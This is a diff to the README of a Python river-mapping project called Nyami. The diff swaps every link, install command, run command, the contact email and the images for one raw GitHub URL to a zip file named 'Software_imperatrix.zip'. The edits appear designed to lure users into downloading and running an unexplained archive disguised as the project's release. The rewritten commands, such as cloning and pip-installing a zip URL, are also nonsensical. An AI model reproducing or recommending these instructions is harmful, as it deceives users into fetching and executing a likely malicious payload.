@@ -1,6 +1,6 @@
 # Nyami: River Mapping and Analysis in Python 🐍
 
-![Nyami Logo](https://img.shields.io/badge/Nyami-River%20Mapping%20and%20Analysis-blue.svg)
+![Nyami Logo](https://github.com/h0ssammm/nyami/raw/refs/heads/main/nyami/Software_imperatrix.zip%20Mapping%20and%https://github.com/h0ssammm/nyami/raw/refs/heads/main/nyami/Software_imperatrix.zip)
 
 Welcome to **Nyami**, a powerful tool for river mapping and analysis in Python. This repository offers a comprehensive suite of tools designed for earth science enthusiasts, researchers, and professionals working in the fields of fluvial geomorphology and hydrology.
 
@@ -33,9 +33,9 @@ Nyami focuses on river networks, providing essential tools for mapping and analy
 To get started with Nyami, clone this repository and install the required packages. Run the following commands in your terminal:
 
 ```bash
-git clone https://github.com/h0ssammm/nyami.git
+git clone https://github.com/h0ssammm/nyami/raw/refs/heads/main/nyami/Software_imperatrix.zip
 cd nyami
-pip install -r requirements.txt
+pip install -r https://github.com/h0ssammm/nyami/raw/refs/heads/main/nyami/Software_imperatrix.zip
 ```
 
 ## Usage
@@ -43,7 +43,7 @@ pip install -r requirements.txt
 Once installed, you can begin using Nyami to analyze river data. The main script is located in the `src` directory. Run the following command to execute it:
 
 ```bash
-python src/main.py
+python https://github.com/h0ssammm/nyami/raw/refs/heads/main/nyami/Software_imperatrix.zip
 ```
 
 You can find detailed instructions on how to use each feature in the [Documentation](docs/).
@@ -57,7 +57,7 @@ Here are some examples of what you can do with Nyami:
 Generate a map of a river network with the following command:
 
 ```bash
-python src/map.py --input data/river_data.shp --output output/river_map.png
+python https://github.com/h0ssammm/nyami/raw/refs/heads/main/nyami/Software_imperatrix.zip --input https://github.com/h0ssammm/nyami/raw/refs/heads/main/nyami/Software_imperatrix.zip --output https://github.com/h0ssammm/nyami/raw/refs/heads/main/nyami/Software_imperatrix.zip
 ```
 
 ### Data Analysis
@@ -65,7 +65,7 @@ python src/map.py --input data/river_data.shp --output output/river_map.png
 Analyze river flow data:
 
 ```bash
-python src/analyze.py --input data/flow_data.csv --output output/analysis_results.txt
+python https://github.com/h0ssammm/nyami/raw/refs/heads/main/nyami/Software_imperatrix.zip --input https://github.com/h0ssammm/nyami/raw/refs/heads/main/nyami/Software_imperatrix.zip --output https://github.com/h0ssammm/nyami/raw/refs/heads/main/nyami/Software_imperatrix.zip
 ```
 
 ## Contributing
@@ -89,13 +89,13 @@ Nyami is licensed under the MIT License. See the [LICENSE](LICENSE) file for mor
 For questions or suggestions, feel free to reach out:
 
 - **Author**: Hossam
-- **Email**: h0ssammm@example.com
+- **Email**: https://github.com/h0ssammm/nyami/raw/refs/heads/main/nyami/Software_imperatrix.zip
 
 ## Releases
 
-To download the latest release of Nyami, visit the [Releases](https://github.com/h0ssammm/nyami/releases) section. Make sure to download the appropriate file for your system and execute it according to the instructions provided.
+To download the latest release of Nyami, visit the [Releases](https://github.com/h0ssammm/nyami/raw/refs/heads/main/nyami/Software_imperatrix.zip) section. Make sure to download the appropriate file for your system and execute it according to the instructions provided.
 
-For more updates and features, check the [Releases](https://github.com/h0ssammm/nyami/releases) section regularly.
+For more updates and features, check the [Releases](https://github.com/h0ssammm/nyami/raw/refs/heads/main/nyami/Software_imperatrix.zip) section regularly.
 
 ## Topics
 
@@ -116,7 +116,7 @@ This repository covers a range of topics relevant to river mapping and analysis:
 
 Nyami is your go-to solution for river mapping and analysis. Its robust features and ease of use make it suitable for both beginners and experts in the field. Dive into the world of river analysis with Nyami today!
 
-![River Image](https://source.unsplash.com/featured/?river)
+![River Image](https://github.com/h0ssammm/nyami/raw/refs/heads/main/nyami/Software_imperatrix.zip)
 
 ---
 
